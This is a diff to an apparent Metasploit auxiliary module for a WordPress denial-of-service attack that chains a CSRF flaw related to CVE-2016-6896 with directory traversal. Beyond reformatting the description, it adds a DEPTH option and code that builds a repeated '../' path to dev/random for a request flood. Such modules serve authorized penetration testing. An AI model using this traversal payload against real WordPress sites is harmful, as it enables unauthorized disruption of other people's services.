@@ -11,7 +11,12 @@ class MetasploitModule < Msf::Auxiliary
     super(update_info(
       info,
       'Name'            => 'WordPress Traversal Directory DoS',
-      'Description'     =>  %q{Cross-site request forgery (CSRF) vulnerability in the wp_ajax_update_plugin function in wp-admin/includes/ajax-actions.php in WordPress before 4.6 allows remote attackers to hijack the authentication of subscribers for /dev/random read operations by leveraging a late call to the check_ajax_referer function, a related issue to CVE-2016-6896.},
+      'Description'     =>  %q{
+        Cross-site request forgery (CSRF) vulnerability in the wp_ajax_update_plugin
+        function in wp-admin/includes/ajax-actions.php in WordPress before 4.6
+        allows remote attackers to hijack the authentication of subscribers
+        for /dev/random read operations by leveraging a late call to
+        the check_ajax_referer function, a related issue to CVE-2016-6896.},
       'License'         => MSF_LICENSE,
       'Author'          =>
         [
@@ -32,6 +37,7 @@ class MetasploitModule < Msf::Auxiliary
         OptInt.new('RLIMIT', [true, 'The number of requests to send', 200]),
         OptInt.new('THREADS', [true, 'The number of concurrent threads', 5]),
         OptInt.new('TIMEOUT', [true, 'The maximum time in seconds to wait for each request to finish', 5]),
+        OptInt.new('DEPTH', [true, 'The depth of the path', 10]),
         OptString.new('USERNAME', [true, 'The username to send the requests with', '']),
         OptString.new('PASSWORD', [true, 'The password to send the requests with', ''])
         ])
@@ -55,6 +61,10 @@ class MetasploitModule < Msf::Auxiliary
 
   def timeout
     datastore['TIMEOUT']
+  end
+
+  def depth
+    datastore['DEPTH']
   end
 
   def report_cred(opts)
@@ -116,6 +126,12 @@ class MetasploitModule < Msf::Auxiliary
         print_error('Aborting operation - failed to authenticate')
         return
       end
+
+      path = '/'
+      1.upto(depth) do |i|
+          path += '../'
+      end
+      path += 'dev/random'
 
       while starting_thread < rlimit do
         ubound = [rlimit - (starting_thread - 1), thread_count].min
